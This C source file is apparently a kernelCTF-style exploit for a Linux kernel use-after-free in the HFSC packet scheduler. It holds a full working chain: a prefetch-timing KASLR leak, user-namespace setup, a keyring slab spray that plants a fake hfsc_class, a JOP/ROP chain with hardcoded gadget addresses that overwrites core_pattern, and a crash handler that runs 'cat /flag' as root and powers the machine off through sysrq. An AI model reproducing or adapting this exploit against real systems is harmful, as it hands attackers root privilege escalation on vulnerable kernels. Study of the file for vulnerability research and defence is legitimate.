#define _GNU_SOURCE
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/net_tstamp.h>
#include <linux/socket.h>
#include <linux/udp.h>
#include <arpa/inet.h>
#include <linux/keyctl.h>
#include <sched.h>
#include <err.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stddef.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <netinet/ip.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <net/if.h>
#include <pthread.h>
#include <libmnl/libmnl.h>
#include <sys/auxv.h>
#include <sys/sendfile.h>
#include <libnftnl/table.h>
#include <libnftnl/flowtable.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/object.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <sys/socket.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/resource.h>
#include <linux/if.h>
#include <linux/keyctl.h>
#include <byteswap.h>
#include <linux/netfilter/ipset/ip_set.h>
#include <linux/netfilter/ipset/ip_set_bitmap.h>
#include <err.h>
#include <linux/if_ether.h>
#include <linux/tc_act/tc_gact.h>
#include <linux/pkt_cls.h>
#include <limits.h>
#include <errno.h>
#include <linux/prctl.h>
#include <sys/prctl.h>

// Kernel base address
uint64_t g_kernel_base = 0xffffffff81000000;

// cos-109-17800.436.60
// p &qfq_qdisc_ops.change
#define QFQ_CHANGE (0xffffffff83d8b138 - 0xffffffff81000000 + g_kernel_base)
// 0xffffffff81c61c0c: push rsi; jmp qword ptr [rsi-0x70];
#define JOP_GADGET (0xffffffff81c61c0c - 0xffffffff81000000 + g_kernel_base)
// 0xffffffff8113f52e: pop rsp; pop r15; ret;
#define ROP_GADGET (0xffffffff8113f52e - 0xffffffff81000000 + g_kernel_base)
#define POP_RDI (0xffffffff81677a6d - 0xffffffff81000000 + g_kernel_base)
#define POP_RSI (0xffffffff8227ddd3 - 0xffffffff81000000 + g_kernel_base)
#define POP_RDX (0xffffffff8227e433 - 0xffffffff81000000 + g_kernel_base)
// _copy_from_user
#define COPY_FROM_USER (0xffffffff818dbc50 - 0xffffffff81000000 + g_kernel_base)
#define MSLEEP (0xffffffff812415d0 - 0xffffffff81000000 + g_kernel_base)
#define CORE_PATTERN (0xffffffff83bbbca0 - 0xffffffff81000000 + g_kernel_base)

/* common utils */
void fatal(const char *msg)
{
    printf("[Fatal!] ");
    puts(msg);
    fflush(stdout);
    fflush(stderr);
    exit(EXIT_FAILURE);
}

#define SYSOK(x) ({                     \
    typeof(x) __res = (x);              \
    if (__res != (typeof(x))0)          \
        err(1, "[fail] SYSOK(" #x ")"); \
    __res;                              \
})

void set_cpu(int c)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(c, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void mypause()
{
    printf("[~] pausing... (press enter to continue)\n");
    char scratch[11];
    read(0, scratch, 10); // wait for input
}
/* common utils end */

/*KASLR leak*/
inline __attribute__((always_inline)) uint64_t rdtsc_begin()
{
    uint64_t a, d;
    asm volatile("mfence\n\t"
                 "RDTSCP\n\t"
                 "mov %%rdx, %0\n\t"
                 "mov %%rax, %1\n\t"
                 "xor %%rax, %%rax\n\t"
                 "lfence\n\t"
                 : "=r"(d), "=r"(a)
                 :
                 : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end()
{
    uint64_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r"(d), "=r"(a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

void prefetch(void *p)
{
    asm volatile(
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        : : "r"(p));
}

size_t flushandreload(void *addr) // row miss
{
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

#include <cpuid.h>
int cpu_is_intel(void)
{
    unsigned int eax, ebx, ecx, edx;
    char vendor[13];

    if (!__get_cpuid(0, &eax, &ebx, &ecx, &edx))
        return -1;

    memcpy(vendor + 0, &ebx, 4);
    memcpy(vendor + 4, &edx, 4);
    memcpy(vendor + 8, &ecx, 4);
    vendor[12] = '\0';

    if (strcmp(vendor, "GenuineIntel") == 0)
        return 1;

    if (strcmp(vendor, "AuthenticAMD") == 0)
        return 0;

    fatal("Unknown CPU type");
    return -1;
}

#define ARRAY_LEN(x) ((int)(sizeof(x) / sizeof(x[0])))
size_t kaslr_leak()
{
    const int is_cpu_intel = cpu_is_intel();
    uint64_t base;
    if (is_cpu_intel)
    {
        puts("[~] Begin KASLR leak (intel)");
#define OFFSET 0
#define START_INTEL (0xffffffff81000000ull + OFFSET)
#define END_INTEL (0xffffffffD0000000ull + OFFSET)
#define STEP_INTEL 0x0000000001000000ull
        while (1)
        {
            uint64_t bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END_INTEL - START_INTEL) / STEP_INTEL] = {};
                uint64_t addrs[(END_INTEL - START_INTEL) / STEP_INTEL];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START_INTEL + STEP_INTEL * (uint64_t)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        uint64_t addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++)
                {
                    if (times[ti] < minv)
                    {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini == (size_t)-1)
                {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                base -= OFFSET;
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %zx with %d votes\n", base, c);
        }
    }
    else
    {
        puts("[~] Begin KASLR leak (AMD)");
#define START_AMD (0xffffffff81000000ull)
#define END_AMD (0xffffffffc0000000ull)
#define STEP_AMD 0x0000000000200000ull
#define NUM_TRIALS 7
// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

        while (1)
        {
            uint64_t bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END_AMD - START_AMD) / STEP_AMD] = {};
                uint64_t addrs[(END_AMD - START_AMD) / STEP_AMD];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START_AMD + STEP_AMD * (uint64_t)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        uint64_t addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++)
                {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++)
                    {
                        sum += times[ti + i];
                    }
                    if (sum > max)
                    {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %zx with %d votes\n", base, c);
        }
    }

got_base:

    return base;
}

// repeats kaslr_leak() multiple times for reliability
size_t kaslr_leak_repeat() {
    const size_t ALIGNMENT = 0x200000;
    const size_t REPEAT = 100;
    size_t candidate = 0;
    size_t hashmap[1024];  // ~ 0xffffffff80000000-0xffffffffc0000000
    memset(&hashmap, 0, sizeof(hashmap));
    sleep(10);

    for (size_t i = 0; i < REPEAT; i++) {
        set_cpu(i % 2);
        sleep(1);
        size_t leak = kaslr_leak();
        size_t idx = (leak - 0xffffffff80000000) / ALIGNMENT;
        if (ALIGNMENT * idx != (leak - 0xffffffff80000000) || idx >= (sizeof(hashmap) / sizeof(hashmap[0]))) {
            continue;
        }
        hashmap[idx]++;
    }

    size_t max = 0;
    for (size_t i = 0; i < (sizeof(hashmap) / sizeof(hashmap[0])); i++) {
        if (hashmap[i] > max) {
            max = hashmap[i];
            candidate = i * ALIGNMENT + 0xffffffff80000000;
        }
    }
    return candidate;    
}
/*KASLR leak end*/

// Unshare stuff
// Write to a file so we can set our user ids
int write_mapping(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
    {
        printf("Failed to open %s: %s\n", path, strerror(errno));
        return -1;
    }

    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content))
    {
        printf("Failed to write to %s: %s\n", path, strerror(errno));
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

void setup_userns(void)
{
    // Unshare into new user namespace
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS) == -1)
    {
        printf("unshare failed: %s\n", strerror(errno));
        exit(-1);
    }

    // First disable setgroups
    if (write_mapping("/proc/self/setgroups", "deny") == -1)
    {
        printf("Failed to disable setgroups\n");
        exit(-1);
    }

    // Then map our UID and GID
    if (write_mapping("/proc/self/uid_map", "0 1000 1") == -1 ||
        write_mapping("/proc/self/gid_map", "0 1000 1") == -1)
    {
        printf("Failed to write ID mappings\n");
        exit(-1);
    }
}

/*netlink utils*/
struct netlink_send_cb_struct
{
    void (*cb)(char *, size_t, void *);
    void *cb_out;
};

int __netlink_send(int fd, const void *nlh, size_t size, char *nlbuf, size_t nlbuf_sz, int has_done_msg, struct netlink_send_cb_struct *cb_info)
{
    char nlbuf_cb_scratch[1024];
    struct iovec iov = {
        .iov_base = (void *)nlh,
        .iov_len = size,
    };
    struct msghdr msg = {
        .msg_name = NULL,
        .msg_namelen = 0,
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0,
    };

    if (sendmsg(fd, &msg, 0) < 0)
    {
        perror("sendmsg()");
        return -1;
    }
    ssize_t ret = recvfrom(fd, nlbuf, nlbuf_sz, 0, NULL, NULL);
    if (ret == -1)
    {
        perror("recvfrom()");
        return -1;
    }

    if (has_done_msg)
    {
        ssize_t ret2 = recvfrom(fd, &nlbuf_cb_scratch, sizeof(nlbuf_cb_scratch), 0, NULL, NULL); // done msg  TODO: not all requests have this...
        if (ret2 == -1)
        {
            perror("recvfrom()");
            return -1;
        }
    }

    struct nlmsghdr *response_nlh = (struct nlmsghdr *)nlbuf;
    {
        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(response_nlh);
        if (err->error)
        {
            fprintf(stderr, "Netlink Result: %s\n", strerror(-err->error));
            return -err->error;
        }
    }

    if (cb_info)
        cb_info->cb(nlbuf, ret, cb_info->cb_out);
    return 0;
}

int netlink_send(int fd, const struct nlmsghdr *nlh)
{
    char nlbuf[4096] = {0}; // Buffer to store the response
    return __netlink_send(fd, nlh, nlh->nlmsg_len, nlbuf, sizeof(nlbuf), 0, NULL);
}

int netlink_open(int proto)
{
    struct sockaddr_nl addr = {0};
    addr.nl_family = AF_NETLINK;

    int s = socket(AF_NETLINK, SOCK_RAW, proto);
    if (s < 0)
    {
        perror("socket()");
        return s;
    }
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        perror("bind()");
        return -1;
    }

    return s;
}
/*netlink utils end*/

/*set interface up*/
int set_interface_flags(int sock, const char *ifname, int flags, int change)
{
    struct
    {
        struct nlmsghdr nlh;
        struct ifinfomsg ifm;
        char buf[64];
    } req;

    // Prepare the netlink request
    memset(&req, 0, sizeof(req));

    // Setup the netlink header
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_SETLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.nlh.nlmsg_seq = 1;

    // Setup the interface info message
    req.ifm.ifi_family = AF_UNSPEC;
    req.ifm.ifi_index = if_nametoindex(ifname);
    if (req.ifm.ifi_index == 0)
    {
        perror("if_nametoindex");
        close(sock);
        return -1;
    }

    // Set the interface flags
    req.ifm.ifi_change = change;
    req.ifm.ifi_flags = flags;

    // Send the netlink message
    struct sockaddr_nl nladdr = {0};
    struct iovec iov;
    struct msghdr msg = {0};
    nladdr.nl_family = AF_NETLINK;
    iov.iov_base = &req.nlh;
    iov.iov_len = req.nlh.nlmsg_len;
    msg.msg_name = &nladdr;
    msg.msg_namelen = sizeof(nladdr);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    if (sendmsg(sock, &msg, 0) < 0)
    {
        perror("send_netlink_message");
        close(sock);
        return -1;
    }

    // Read the ACK response
    char buf[4096];
    int len;
    struct nlmsghdr *resp_nlh;

    len = recv(sock, buf, sizeof(buf), 0);
    if (len < 0)
    {
        perror("recv");
        close(sock);
        return -1;
    }

    resp_nlh = (struct nlmsghdr *)buf;
    if (resp_nlh->nlmsg_type == NLMSG_ERROR)
    {
        struct nlmsgerr *err = NLMSG_DATA(resp_nlh);
        if (err->error != 0)
        {
            fprintf(stderr, "Netlink error: %s\n", strerror(-err->error));
            close(sock);
            return -1;
        }
    }
    return 0;
}

// Function to bring an interface up
int set_interface_up(int fd, const char *ifname)
{
    return set_interface_flags(fd, ifname, IFF_UP, IFF_UP);
}
/*set interface up end*/

/*requests*/
int _send_req(int priority, int no_block)
{
    int sock;
    struct sockaddr_in server;

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("Failed to create socket");
        return 1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) < 0)
    {
        perror("Failed to set socket priority");
        close(sock);
        return 1;
    }

    if (!no_block)
    {
        // Set socket to non-blocking mode
        int flags = fcntl(sock, F_GETFL, 0);
        if (flags < 0)
        {
            perror("Failed to get socket flags");
            close(sock);
            return 1;
        }
        if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0)
        {
            perror("Failed to set socket to non-blocking");
            close(sock);
            return 1;
        }
    }

    // Configure server address
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);
    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0)
    {
        perror("Invalid address");
        close(sock);
        return 1;
    }

    // Send empty datagram
    if (sendto(sock, "", 0, 0, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        perror("Failed to send");
        close(sock);
        return 1;
    }

    close(sock);
    return 0;
}

int send_req(int priority)
{
    return _send_req(priority, 0);
}

int send_req_noblock(int priority)
{
    return _send_req(priority, 1);
}
/*requests end*/

/*util functions for tc*/
int get_qdisc_handle(__u32 *h, const char *str)
{
    *h = 0;
    __u32 maj;
    char *p;

    maj = TC_H_UNSPEC;
    if (strcmp(str, "none") == 0)
        goto ok;
    maj = strtoul(str, &p, 16);
    if (p == str || maj >= (1 << 16))
        return -1;
    maj <<= 16;
    if (*p != ':' && *p != 0)
        return -1;
ok:
    *h = maj;
    return 0;
}

int get_tc_classid(__u32 *h, const char *str)
{
    __u32 maj, min;
    char *p;

    maj = TC_H_ROOT;
    if (strcmp(str, "root") == 0)
        goto ok;
    maj = TC_H_UNSPEC;
    if (strcmp(str, "none") == 0)
        goto ok;
    maj = strtoul(str, &p, 16);
    if (p == str)
    {
        maj = 0;
        if (*p != ':')
            return -1;
    }
    if (*p == ':')
    {
        if (maj >= (1 << 16))
            return -1;
        maj <<= 16;
        str = p + 1;
        min = strtoul(str, &p, 16);
        if (*p != 0)
            return -1;
        if (min >= (1 << 16))
            return -1;
        maj |= min;
    }
    else if (*p != 0)
        return -1;

ok:
    *h = maj;
    return 0;
}

static __u32 get_id(const char *s_class)
{
    if (s_class[strlen(s_class) - 1] == '0')
    {
        // eg 2.0
        __u32 result;
        SYSOK(get_qdisc_handle(&result, s_class));
        return result;
    }
    else
    {
        // eg 2.1
        __u32 result;
        SYSOK(get_tc_classid(&result, s_class));
        return result;
    }
}
/*util functions for tc end*/

/*keyring section*/
#define KEY_DESC_SIZE (0x200 - 0x18 + 1)
char key_desc[KEY_DESC_SIZE];

typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size)
{
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        fatal("calloc");

    for (uint32_t i = start; i < start + spray_size; i++)
    {
        key_desc[0] = '\x01' + i;
        id_buffer[i] = add_key("user", key_desc, key_desc, sizeof(key_desc), KEY_SPEC_PROCESS_KEYRING);
    }

    return id_buffer;
}
/*keyring section end*/

#include "qdisc.h"

/*exp code start*/
int setup_uaf(const int netlink_fd)
{
    struct tc_service_curve fsc = {
        .d = 1,
        .m1 = UINT_MAX,
        .m2 = UINT_MAX};
    SYSOK(create_qdisc_hfsc(netlink_fd, get_id("1:0"), TC_H_ROOT));                       // parent is root
    SYSOK(create_class_hfsc(netlink_fd, get_id("1:1"), get_id("1:0"), NULL, &fsc, NULL)); // no rsc

    SYSOK(create_class_hfsc(netlink_fd, get_id("1:2"), get_id("1:0"), NULL, &fsc, NULL)); // no rsc
    SYSOK(create_qdisc_netem(netlink_fd, get_id("2:0"), get_id("1:1")));
    SYSOK(create_qdisc_pfifo(netlink_fd, get_id("3:0"), get_id("1:2"))); // doesn't matter what qdisc, as long as it is successful
    SYSOK(send_req(get_id("1:1")));

    puts("[~] deleting class");
    SYSOK(delete_class(netlink_fd, get_id("1:1"), get_id("1:0"), "drr"));

    return 0;
}

void trigger_uaf()
{
    // enqueue into hfsc
    SYSOK(send_req(get_id("1:2")));
    // qdisc_run triggers hfsc_dequeue(), which selects UAF class
}

const char desired_core_pattern[] = "|/proc/%P/fd/666 %P";
int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {0};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, desired_core_pattern, strlen(desired_core_pattern)) == 0;
}

void crash()
{
    int memfd = memfd_create("", 0);
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    while (check_core() == 0)
        usleep(100); // 0.1ms

    *(size_t *)0 = 0;
}

int new_qfq_qdisc(int sock_fd, __u32 my_handle, __u32 parent_handle, size_t buf1_len, const char *buf1, size_t buf2_len, const char *buf2)
{
    char buf[0x1000] = {0};
    struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);

    nlh->nlmsg_type = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;

    struct tcmsg *tcm = mnl_nlmsg_put_extra_header(nlh, sizeof(struct tcmsg));
    tcm->tcm_family = AF_UNSPEC;
    unsigned int ifindex = if_nametoindex(PWN_TC_QDISC_INTERFACE);
    if (ifindex == 0)
        fatal("ifindex");
    tcm->tcm_ifindex = ifindex;
    tcm->tcm_handle = my_handle;
    tcm->tcm_parent = parent_handle;

    mnl_attr_put_strz(nlh, TCA_KIND, "qfq");
    mnl_attr_put(nlh, TCA_OPTIONS, buf1_len, buf1);
    mnl_attr_put(nlh, TCA_OPTIONS, buf2_len, buf2);

    return netlink_send(sock_fd, nlh);
}

/* hfsc_class offsets (obtained from pahole) */
// COS version (note, offsets change from COS to LTS)
#define KEY_DESC_HEADER_SIZE 0x18
#define LEVEL_OFFSET 100
#define CL_PARENT_OFFSET 112
#define VT_NODE_OFFSET 192
#define CF_NODE_OFFSET 224
#define CL_VT_OFFSET 280
#define CL_CVTMIN_OFFSET 312
#define CL_E_OFFSET 272

int prep_key_desc(size_t target, size_t write_val)
{
    /* Place fake hfsc_class in keydesc */
    memset(key_desc, 0, sizeof(key_desc));

    /* hfsc_class.level = 1 (must be non-zero) */
    key_desc[LEVEL_OFFSET - KEY_DESC_HEADER_SIZE] = 1;
    /* hfsc_class.vt_node = 1 (must be odd) */
    key_desc[VT_NODE_OFFSET - KEY_DESC_HEADER_SIZE] = 1;
    /* hfsc_class.cf_node = 1 (must be odd) */
    key_desc[CF_NODE_OFFSET - KEY_DESC_HEADER_SIZE] = 1;

    /* hfsc_class.cl_e > cur_time (fail eltree_get_mindl)*/
    *(size_t *)&key_desc[CL_E_OFFSET - KEY_DESC_HEADER_SIZE] = 0xffffffffffffffff;

    /* hfsc_class.parent = &qfq_change_qdisc (write target)*/
    *(size_t *)&key_desc[CL_PARENT_OFFSET - KEY_DESC_HEADER_SIZE] = target - CL_CVTMIN_OFFSET;
    /* hfsc_class.cl_vt = jop_gadget (write value) */
    *(size_t *)&key_desc[CL_VT_OFFSET - KEY_DESC_HEADER_SIZE] = write_val;

    return 0;
}

void core_pattern_handler(char **argv)
{
    int pid = strtoull(argv[1], 0, 10);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    dup2(stdinfd, 0);
    dup2(stdoutfd, 1);
    dup2(stderrfd, 2);
    /* Get flag and poweroff immediately to boost next round try in PR verification workflow */
    system("cat /flag;sleep 1;echo o>/proc/sysrq-trigger");
    exit(0);
}

void prep_rop(char *payload1, char *payload2)
{
    *(size_t *)&payload1[0x10] = ROP_GADGET;
    size_t *rop = (size_t *)&payload2[4];
    size_t x = 0;
    rop[x++] = POP_RDI;
    rop[x++] = CORE_PATTERN;
    rop[x++] = POP_RSI;
    rop[x++] = (size_t)&desired_core_pattern;
    rop[x++] = POP_RDX;
    rop[x++] = sizeof(desired_core_pattern);
    rop[x++] = COPY_FROM_USER;
    // msleep(0x10000);
    rop[x++] = POP_RDI;
    rop[x++] = 0x10000;
    rop[x++] = MSLEEP;
}

void trigger_qfq_change(const int netlink_fd, const char *payload1, size_t payload1_sz, const char *payload2, size_t payload2_sz)
{
    puts("[~] triggering qdisc change now");
    struct tc_service_curve rsc = {
        .d = 1,
        .m1 = UINT_MAX,
        .m2 = UINT_MAX};
    // create class to attach qdisc to
    SYSOK(create_class_hfsc(netlink_fd, get_id("1:6"), get_id("1:0"), &rsc, &rsc, NULL));
    // create qdisc
    SYSOK(new_qfq_qdisc(netlink_fd, get_id("7:0"), get_id("1:6"), payload1_sz, payload1, payload2_sz, payload2));
    // trigger change
    // before rsi is param1 contiguous, rsi = 4 hdr bytes + buf2
    SYSOK(new_qfq_qdisc(netlink_fd, get_id("7:0"), get_id("1:6"), payload1_sz, payload1, payload2_sz, payload2));
}

int main(int argc, char **argv)
{
    setvbuf(stdout, 0, 2, 0);
    if (argc > 1)
    {
        core_pattern_handler(argv);
    }

    g_kernel_base = kaslr_leak_repeat();
    printf("[>] Kernel base address: 0x%lx\n", g_kernel_base);

    if (geteuid() != 0)
        setup_userns();

    set_cpu(0); // main exploit thread runs on CPU 0. others will run on CPU 1.

    const int netlink_fd = netlink_open(NETLINK_ROUTE);
    if (netlink_fd < 0)
    {
        fprintf(stderr, "Failed to open Netlink socket\n");
        return EXIT_FAILURE;
    }

    SYSOK(set_interface_up(netlink_fd, "lo"));

    // used when spraying later
    prep_key_desc(QFQ_CHANGE, JOP_GADGET);

    puts("[+] prepping UAF");
    setup_uaf(netlink_fd);

    puts("[+] spraying slab to reclaim with key_desc");
    spray_keyring(0, 30);

    puts("[+] sending request, will trigger hfsc dequeue");
    trigger_uaf();

    puts("[~] forking process for core_pattern exp later");
    if (fork() == 0) // this process is used to trigger core_pattern exploit
    {
        set_cpu(1);
        crash();
    }

    char payload1[0x80] = {0};
    char payload2[0x80] = {0};
    prep_rop(payload1, payload2);

    trigger_qfq_change(netlink_fd, payload1, sizeof(payload1), payload2, sizeof(payload2));
    return 0;
}